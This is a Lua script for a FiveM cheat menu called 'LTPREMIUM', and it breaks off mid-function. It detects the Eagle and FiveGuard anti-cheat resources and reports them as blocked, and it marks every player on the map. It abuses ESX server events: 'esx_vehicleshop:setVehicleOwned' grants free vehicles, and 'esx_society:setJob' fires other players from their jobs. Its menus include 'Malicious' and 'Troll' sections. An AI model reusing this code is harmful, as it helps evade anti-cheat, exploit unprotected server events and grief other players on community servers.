--local KeysBin = MachoWebRequest("https://raw.githubusercontent.com/bv3d05/skgjfd/refs/heads/main/README.md")
--local CurrentKey = MachoAuthenticationKey()
--if not string.find(KeysBin, CurrentKey, 1, true) then
   --MachoMenuNotification("Authentication Failed", "Your key is not authorized.")
  --return
--end



local ecResources = {"EC-PANEL", "EC_AC"}
for _, resource in ipairs(ecResources) do
    if GetResourceState(resource) == "started" then
        MachoMenuNotification("Eagle AC Detected", "Blocking resource: " .. resource)
        print(resource)
        MachoMenuNotification("Eagle AC Blocked", "Resource " .. resource .. " stopped.")
    end
end

Citizen.CreateThread(function()
    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local x = GetResourceMetadata(resource, 'client_script', j)
            if x ~= nil and string.find(x, "obfuscated") then
                MachoMenuNotification("FiveGuard AC Detected", "Blocking resource: " .. resource)
                print(resource)
                MachoMenuNotification("FiveGuard Blocked", "Resource " .. resource .. " stopped.")
                break
            end
        end
    end
end)
local z = nil
enabled = enabled
KAKAAKAKAK = enabled


TriggerServerEvent = TriggerServerEvent


GetHashKey = GetHashKey


LTPREMIUM = { } 
LTPREMIUM.debug = false

jd366213 = false
KZjx = jd366213
ihrug = nil
WADUI = ihrug

local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end
		enum.destructor = nil
		enum.handle = nil
	end
}
wdihwaduaw = true
jejejejej = wdihwaduaw
xjbvxyg3e = jejejejej
waduyh487r64 = xjbvxyg3e


function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
		local iter, id = initFunc()
		if not id or id == 0 then
			disposeFunc(iter)
			return
		end
	
		local enum = {handle = iter, destructor = disposeFunc}
		setmetatable(enum, entityEnumerator)
	
		local next = true
		repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
		until not next
	
		enum.destructor, enum.handle = nil, nil
		disposeFunc(iter)
	end)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

function GetAllPeds()
    local peds123 = {}
    for ped in EnumeratePeds() do
        if DoesEntityExist(ped) then
            table.insert(peds123, ped)
        end
    end
    return peds123
end



  
local Deer = {
	Handle = nil,
	Invincible = false,
	Ragdoll = false,
	Marker = false,
	Speed = {
		Walk = 3.0,
		Run = 9.0,
	},
}

function GetNearbyPeds(X, Y, Z, Radius)
	local NearbyPeds = {}
	for Ped in EnumeratePeds() do
		if DoesEntityExist(Ped) then
			local PedPosition = GetEntityCoords(Ped, false)
			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
				table.insert(NearbyPeds, Ped)
			end
		end
	end
	return NearbyPeds
end

function GetCoordsInfrontOfEntityWithDistance(Entity, Distance, Heading)
	local Coordinates = GetEntityCoords(Entity, false)
	local Head = (GetEntityHeading(Entity) + (Heading or 0.0)) * math.pi / 180.0
	return {x = Coordinates.x + Distance * math.sin(-1.0 * Head), y = Coordinates.y + Distance * math.cos(-1.0 * Head), z = Coordinates.z}
end

function GetGroundZ(X, Y, Z)
	if tonumber(X) and tonumber(Y) and tonumber(Z) then
		local _, GroundZ = GetGroundZFor_3dCoord(X + 0.0, Y + 0.0, Z + 0.0, Citizen.ReturnResultAnyway())
		return GroundZ
	else
		return 0.0
	end
end

function Deer.Destroy()
	local Ped = PlayerPedId()

	DetachEntity(Ped, true, false)
	ClearPedTasksImmediately(Ped)

	SetEntityAsNoLongerNeeded(Deer.Handle)
	DeletePed(Deer.Handle)

	if DoesEntityExist(Deer.Handle) then
		SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
	end

	Deer.Handle = nil
end

function Deer.Create()
	local Model = GetHashKey("a_c_deer")
	RequestModel(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
	SetEntityInvincible(Deer.Handle, Deer.Invincible)

	SetModelAsNoLongerNeeded(Model)
end

function Deer.Attach()
	local Ped = PlayerPedId()

	FreezeEntityPosition(Deer.Handle, true)
	FreezeEntityPosition(Ped, true)

	local DeerPosition = GetEntityCoords(Deer.Handle, false)
	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)

	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)

	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)

	FreezeEntityPosition(Deer.Handle, false)
	FreezeEntityPosition(Ped, false)
end

function Deer.Ride()
	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)
	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
		return
	end

	local AttachedEntity = GetEntityAttachedTo(Ped)

	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
		local SideHeading = GetEntityHeading(AttachedEntity)

		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)

		Deer.Handle = nil
		DetachEntity(Ped, true, false)
		ClearPedTasksImmediately(Ped)

		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
		SetEntityHeading(Ped, SideHeading)
	else
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
		end
	end
end

Citizen.CreateThread(function()
	RequestAnimDict("rcmjosh2")
	while not HasAnimDictLoaded("rcmjosh2") do
		Citizen.Wait(250)
	end
	while true do
		Citizen.Wait(-1000)



		local Ped = PlayerPedId()
		local AttachedEntity = GetEntityAttachedTo(Ped)

		if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
			if DoesEntityExist(Deer.Handle) then
				local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
				local Speed, Range = Deer.Speed.Walk, 4000.0


				local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)

				TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
				TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)

				if Deer.Marker then
					DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255, 255, 255, 0, 0, 2, 0, 0, 0, 0)
				end
			end
		end
	end
end)



local Enabled = true

local states = {}
states.frozen = false
states.frozenPos = nil
kkkk = "LTPREMIUM"
local planeisbest = false
local dEI = kkkk


local ojtgh = "50.0"
local a = 1

local cg = true
local ch = false
local ci = true
local chdata = {}
	function mysplit(inputstr, sep)
		if sep == nil then
			sep = "%s"
		end
		local t={} ; i=1
		for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
			t[i] = str
			i = i + 1
		end
		return t
	end

	local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu",
                            "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu",
                            "TeleportMenu", "LSC", "Hedit", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu",
                            "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "SingleWepPlayer", "VehBoostMenu",
                            "ESXMiscMenu", "ESXDrugMenu", "AI", "SettingsMenu", "VRPMenu"}
	
local handlingData = {
	"handlingName",
	"fMass",
	"fInitialDragCoeff",
	"fPercentSubmerged",
	"vecCentreOfMassOffset",
	"vecInertiaMultiplier",
	"fDriveBiasFront",
	"nInitialDriveGears",
	"fInitialDriveForce",
	"fDriveInertia",
	"fClutchChangeRateScaleUpShift",
	"fClutchChangeRateScaleDownShift",
	"fInitialDriveMaxFlatVel",
	"fBrakeForce",
	"fBrakeBiasFront",
	"fHandBrakeForce",
	"fSteeringLock",
	"fTractionCurveMax",
	"fTractionCurveMin",
	"fTractionCurveLateral",
	"fTractionSpringDeltaMax",
	"fLowSpeedTractionLossMult",
	"fCamberStiffnesss",
	"fTractionBiasFront",
	"fTractionLossMult",
	"fSuspensionForce",
	"fSuspensionCompDamp",
	"fSuspensionReboundDamp",
	"fSuspensionUpperLimit",
	"fSuspensionLowerLimit",
	"fSuspensionRaise",
	"fSuspensionBiasFront",
	"fTractionCurveMax",
	"fAntiRollBarForce",
	"fAntiRollBarBiasFront",
	"fRollCentreHeightFront",
	"fRollCentreHeightRear",
	"fCollisionDamageMult",
	"fWeaponDamageMult",
	"fDeformationDamageMult",
	"fEngineDamageMult",
	"fPetrolTankVolume",
	"fOilVolume",
	"fSeatOffsetDistX",
	"fSeatOffsetDistY",
	"fSeatOffsetDistZ",
	"nMonetaryValue",
	"strModelFlags",
	"strHandlingFlags",
	"strDamageFlags",
	"AIHandling",
	
	
	"fThrust",
	"fThrustFallOff",
	"fThrustVectoring",
	"fYawMult",
	"fYawStabilise",
	"fSideSlipMult",
	"fRollMult",
	"fRollStabilise",
	"fPitchMult",
	"fPitchStabilise",
	"fFormLiftMult",
	"fAttackLiftMult",
	"fAttackDiveMult",
	"fGearDownDragV",
	"fGearDownLiftMult",
	"fWindMult",
	"fMoveRes",
	"vecTurnRes",
	"vecSpeedRes",
	"fGearDoorFrontOpen",
	"fGearDoorRearOpen",
	"fGearDoorRearOpen2",
	"fGearDoorRearMOpen",
	"fTurublenceMagnitudeMax",
	"fTurublenceForceMulti",
	"fTurublenceRollTorqueMulti",
	"fTurublencePitchTorqueMulti",
	"fBodyDamageControlEffectMult",
	"fInputSensitivityForDifficulty",
	"fOnGroundYawBoostSpeedPeak",
	"fOnGroundYawBoostSpeedCap",
	"fEngineOffGlideMulti",
	"handlingType",
	"fThrustFallOff",
	"fThrustFallOff",
	
	
	"fBackEndPopUpCarImpulseMult",
	"fBackEndPopUpBuildingImpulseMult",
	"fBackEndPopUpMaxDeltaSpeed",
	
	

	
	"fLeanFwdCOMMult",
	"fLeanFwdForceMult",
	"fLeanBakCOMMult",
	"fLeanBakForceMult",
	"fMaxBankAngle",
	"fFullAnimAngle",
	"fDesLeanReturnFrac",
	"fStickLeanMult",
	"fBrakingStabilityMult",
	"fInAirSteerMult",
	"fWheelieBalancePoint",
	"fStoppieBalancePoint",
	"fWheelieSteerMult",
	"fRearBalanceMult",
	"fFrontBalanceMult",
	"fBikeGroundSideFrictionMult",
	"fBikeWheelGroundSideFrictionMult",
	"fBikeOnStandLeanAngle",
	"fBikeOnStandSteerAngle",
	"fJumpForce",
}



Citizen.CreateThread(function()

	function SetVehicleHandlingData(Vehicle,Data,Value) 
		if DoesEntityExist(Vehicle) and Data and Value then
			for theKey,property in pairs(handlingData) do 
				if property == Data then
					local intfind = string.find(property, "n" ) 
					local floatfind = string.find(property, "f" )
					local strfind = string.find(property, "str" )
					local vecfind = string.find(property, "vec" )
					
					
					if intfind ~= nil and intfind == 1 then
						SetVehicleHandlingInt( Vehicle, "CHandlingData", Data, tonumber(Value) ) 
					elseif floatfind ~= nil and floatfind == 1 then
						local Value = tonumber(Value)+.0
						SetVehicleHandlingFloat( Vehicle, "CHandlingData", Data, tonumber(Value) )
					elseif strfind ~= nil and strfind == 1 then
						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
					elseif vecfind ~= nil and vecfind == 1 then
						SetVehicleHandlingVector( Vehicle, "CHandlingData", Data, Value )
					else
						SetVehicleHandlingField( Vehicle, "CHandlingData", Data, Value )
					end
				end
			end
		end
	end
	
	
	function GetVehicleHandlingData(Vehicle,Data)
		if DoesEntityExist(Vehicle) then
			for theKey,property in pairs(handlingData) do 
				if property == Data then
					local intfind = string.find(property, "n" )
					local floatfind = string.find(property, "f" )
					local strfind = string.find(property, "str" )
					local vecfind = string.find(property, "vec" )
					
					if intfind ~= nil and intfind == 1 then
						return GetVehicleHandlingInt( Vehicle, "CHandlingData", Data )
					elseif floatfind ~= nil and floatfind == 1 then
						return GetVehicleHandlingFloat( Vehicle, "CHandlingData", Data )
					elseif vecfind ~= nil and vecfind == 1 then
						return GetVehicleHandlingVector( Vehicle, "CHandlingData", Data )
					else
						return false
					end
				end
			end
		end
	end
	
	function GetAllVehicleHandlingData(Vehicle)
		local VehicleHandlingData = {}
		if DoesEntityExist(Vehicle) then
			for i,theData in pairs(handlingData) do 
				local intfind = string.find(theData, "n" )
				local floatfind = string.find(theData, "f" )
				local strfind = string.find(theData, "str" )
				local vecfind = string.find(theData, "vec" )
				
				if intfind ~= nil and intfind == 1 and GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ) then
					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingInt( Vehicle, "CHandlingData", theData ), type = "int" }  )
				elseif floatfind ~= nil and floatfind == 1 and GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ) then
					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingFloat( Vehicle, "CHandlingData", theData ), type = "float" } )
				elseif vecfind ~= nil and vecfind == 1 and GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ) then
					table.insert(VehicleHandlingData, { name = theData, value = GetVehicleHandlingVector( Vehicle, "CHandlingData", theData ), type = "vector3" } )
				end
			end
			return VehicleHandlingData
		end
	end
	
		
	
	
end
)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(-1000)
		if(states.frozen)then
			ClearPedTasksImmediately(GetPlayerPed(-1))
			SetEntityCoords(GetPlayerPed(-1), states.frozenPos)
		end
	end
end)

Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for i = 0, 128 do
                if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
                   local ped = GetPlayerPed(i)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(i), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(i)
                    if ch then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cg then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, i)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, i)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, i)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, i)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, i)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)

local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(-1000)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Success', false)
    else
        av('~b~~h~Model is not valid!', true)
    end
end

local function e()
    local name = GetPlayerName(PlayerId())
end
local o = {}
local h = false
rot = 1
local j = false
local bw = true
local b8 = false
local b9 = false
local ba = false
local bb = false
local bc = nil
local bd = {
        {
            name = "Spoilers", id = 0
        }, {
            name = "Front Bumper", id = 1
        }, {
            name = "Rear Bumper", id = 2
        }, {
            name = "Side Skirt", id = 3
        }, {
            name = "Exhaust", id = 4
        }, {
            name = "Frame", id = 5
        }, {
            name = "Grille", id = 6
        }, {
            name = "Hood", id = 7
        }, {
            name = "Fender", id = 8
        }, {
            name = "Right Fender", id = 9
        }, {
            name = "Roof", id = 10
        }, {
            name = "Vanity Plates", id = 25
        }, {
            name = "Trim", id = 27
        }, {
            name = "Ornaments", id = 28
        }, {
            name = "Dashboard", id = 29
        }, {
            name = "Dial", id = 30
        }, {
            name = "Door Speaker", id = 31
        }, {
            name = "Seats", id = 32
        }, {
            name = "Steering Wheel", id = 33
        }, {
            name = "Shifter Leavers", id = 34
        }, {
            name = "Plaques", id = 35
        }, {
            name = "Speakers", id = 36
        }, {
            name = "Trunk", id = 37
        }, {
            name = "Hydraulics", id = 38
        }, {
            name = "Engine Block", id = 39
        }, {
            name = "Air Filter", id = 40
        }, {
            name = "Struts", id = 41
        }, {
            name = "Arch Cover", id = 42
        }, {
            name = "Aerials", id = 43
        }, {
            name = "Trim 2", id = 44
        }, {
            name = "Tank", id = 45
        }, {
            name = "Windows", id = 46
        }, {
            name = "Livery", id = 48
        }, {
            name = "Wheels", id = 23
        }, {
            name = "Wheel Types", id = "wheeltypes"
        }, {
            name = "Extras", id = "extra"
        }, {
            name = "Neons", id = "neon"
        }, {
            name = "Paint", id = "paint"
        }, {
            name = "Headlights Color", id = "headlight"
        },  {
            name = "Licence Plate", id = "licence"                           
        }
    }
    
    local be = {
        {
            name = "Engine", id = 11
        }, {
            name = "Brakes", id = 12
        }, {
            name = "Transmission", id = 13
        }, {
            name = "Suspension", id = 15
        }
    }
    
    local bo = {
        {
            name = "Default", id = -1
        }, {
            name = "White", id = 0
        }, {
            name = "Blue", id = 1
        }, {
            name = "Electric Blue", id = 2
        }, {
            name = "Mint Green", id = 3
        }, {
            name = "Lime Green", id = 4
        }, {
            name = "Yellow", id = 5
        }, {
            name = "Golden Shower", id = 6
        }, {
            name = "Orange", id = 7
        }, {
            name = "Red", id = 8
        }, {
            name = "Pony Pink", id = 9
        }, {
            name = "Hot Pink", id = 10
        }, {
            name = "Purple", id = 11
        }, {
            name = "Blacklight", id = 12
        }
    }
    
    local colors = {
        ["White"] = {
            255, 255, 255
        }, ["Blue"] = {
            0, 0, 255
        }, ["Electric Blue"] = {
            0, 150, 255
        }, ["Mint Green"] = {
            50, 255, 155
        }, ["Lime Green"] = {
            0, 255, 0
        }, ["Yellow"] = {
            255, 255, 0
        }, ["Golden Shower"] = {
            204, 204, 0
        }, ["Orange"] = {
            255, 128, 0
        }, ["Red"] = {
            255, 0, 0
        }, ["Pony Pink"] = {
            255, 102, 255
        }, ["Hot Pink"] = {
            255, 0, 255
        }, ["Purple"] = {
            153, 0, 153
        }
    }
    
	-- 4x482
	
    local bg = {
        {
            name = "Black", id = 0
        }, {
            name = "Carbon Black", id = 147
        }, {
            name = "Graphite", id = 1
        }, {
            name = "Anhracite Black", id = 11
        }, {
            name = "Black Steel", id = 2
        }, {
            name = "Dark Steel", id = 3
        }, {
            name = "Silver", id = 4
        }, {
            name = "Bluish Silver", id = 5
        }, {
            name = "Rolled Steel", id = 6
        }, {
            name = "Shadow Silver", id = 7
        }, {
            name = "Stone Silver", id = 8
        }, {
            name = "Midnight Silver", id = 9
        }, {
            name = "Cast Iron Silver", id = 10
        }, {
            name = "Red", id = 27
        }, {
            name = "Torino Red", id = 28
        }, {
            name = "Formula Red", id = 29
        }, {
            name = "Lava Red", id = 150
        }, {
            name = "Blaze Red", id = 30
        }, {
            name = "Grace Red", id = 31
        }, {
            name = "Garnet Red", id = 32
        }, {
            name = "Sunset Red", id = 33
        }, {
            name = "Cabernet Red", id = 34
        }, {
            name = "Wine Red", id = 143
        }, {
            name = "Candy Red", id = 35
        }, {
            name = "Hot Pink", id = 135
        }, {
            name = "Pfsiter Pink", id = 137
        }, {
            name = "Salmon Pink", id = 136
        }, {
            name = "Sunrise Orange", id = 36
        }, {
            name = "Orange", id = 38
        }, {
            name = "Bright Orange", id = 138
        }, {
            name = "Gold", id = 99
        }, {
            name = "Bronze", id = 90
        }, {
            name = "Yellow", id = 88
        }, {
            name = "Race Yellow", id = 89
        }, {
            name = "Dew Yellow", id = 91
        }, {
            name = "Dark Green", id = 49
        }, {
            name = "Racing Green", id = 50
        }, {
            name = "Sea Green", id = 51
        }, {
            name = "Olive Green", id = 52
        }, {
            name = "Bright Green", id = 53
        }, {
            name = "Gasoline Green", id = 54
        }, {
            name = "Lime Green", id = 92
        }, {
            name = "Midnight Blue", id = 141
        }, {
            name = "Galaxy Blue", id = 61
        }, {
            name = "Dark Blue", id = 62
        }, {
            name = "Saxon Blue", id = 63
        }, {
            name = "Blue", id = 64
        }, {
            name = "Mariner Blue", id = 65
        }, {
            name = "Harbor Blue", id = 66
        }, {
            name = "Diamond Blue", id = 67
        }, {
            name = "Surf Blue", id = 68
        }, {
            name = "Nautical Blue", id = 69
        }, {
            name = "Racing Blue", id = 73
        }, {
            name = "Ultra Blue", id = 70
        }, {
            name = "Light Blue", id = 74
        }, {
            name = "Chocolate Brown", id = 96
        }, {
            name = "Bison Brown", id = 101
        }, {
            name = "Creeen Brown", id = 95
        }, {
            name = "Feltzer Brown", id = 94
        }, {
            name = "Maple Brown", id = 97
        }, {
            name = "Beechwood Brown", id = 103
        }, {
            name = "Sienna Brown", id = 104
        }, {
            name = "Saddle Brown", id = 98
        }, {
            name = "Moss Brown", id = 100
        }, {
            name = "Woodbeech Brown", id = 102
        }, {
            name = "Straw Brown", id = 99
        }, {
            name = "Sandy Brown", id = 105
        }, {
            name = "Bleached Brown", id = 106
        }, {
            name = "Schafter Purple", id = 71
        }, {
            name = "Spinnaker Purple", id = 72
        }, {
            name = "Midnight Purple", id = 142
        }, {
            name = "Bright Purple", id = 145
        }, {
            name = "Cream", id = 107
        }, {
            name = "Ice White", id = 111
        }, {
            name = "Frost White", id = 112
        }
    }
    
    local bi = {
        {
            name = "Black", id = 12
        }, {
            name = "Gray", id = 13
        }, {
            name = "Light Gray", id = 14
        }, {
            name = "Ice White", id = 131
        }, {
            name = "Blue", id = 83
        }, {
            name = "Dark Blue", id = 82
        }, {
            name = "Midnight Blue", id = 84
        }, {
            name = "Midnight Purple", id = 149
        }, {
            name = "Schafter Purple", id = 148
        }, {
            name = "Red", id = 39
        }, {
            name = "Dark Red", id = 40
        }, {
            name = "Orange", id = 41
        }, {
            name = "Yellow", id = 42
        }, {
            name = "Lime Green", id = 55
        }, {
            name = "Green", id = 128
        }, {
            name = "Forest Green", id = 151
        }, {
            name = "Foliage Green", id = 155
        }, {
            name = "Olive Darb", id = 152
        }, {
            name = "Dark Earth", id = 153
        }, {
            name = "Desert Tan", id = 154
        }
    }
    
    local bj = {
        {
            name = "Brushed Steel", id = 117
        }, {
            name = "Brushed Black Steel", id = 118
        }, {
            name = "Brushed Aluminum", id = 119
        }, {
            name = "Pure Gold", id = 158
        }, {
            name = "Brushed Gold", id = 159
        }
    }
local bk = false


local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end


function checkValidVehicleExtras()
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(ay, i) then
            local aA = '~h~Extra #' .. tostring(i)
            local I = 'OFF'
            if IsVehicleExtraTurnedOn(ay, i) then
                I = 'ON'
            end
            local aB = '~h~extra ' .. tostring(i)
            table.insert(
                az,
                {
                    menuName = realModName,
                    data = {
                        ['action'] = realSpawnName,
                        ['state'] = I
                    }
                }
            )
        end
    end
    return az
end

function FirePlayer(SelectedPlayer)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(SelectedPlayer) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

function DoesVehicleHaveExtras(veh)
    for i = 1, 30 do
        if DoesExtraExist(veh, i) then
            return true
        end
    end
    return false
end

function checkValidVehicleMods(aC)
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    local aD = GetNumVehicleMods(ay, aC)
    if aC == 48 and aD == 0 then
        local aD = GetVehicleLiveryCount(ay)
        for i = 1, aD, 1 do
            local aE = i - 1
            local aF = GetLiveryName(ay, aE)
            local realModName = GetLabelText(aF)
            local aG, realSpawnName = aC, aE
            az[i] = {
                menuName = realModName,
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        end
    end
    for i = 1, aD, 1 do
        local aE = i - 1
        local aF = GetModTextLabel(ay, aC, aE)
        local realModName = GetLabelText(aF)
        local aG, realSpawnName = aD, aE
        az[i] = {
            menuName = realModName,
            data = {
                ['modid'] = aG,
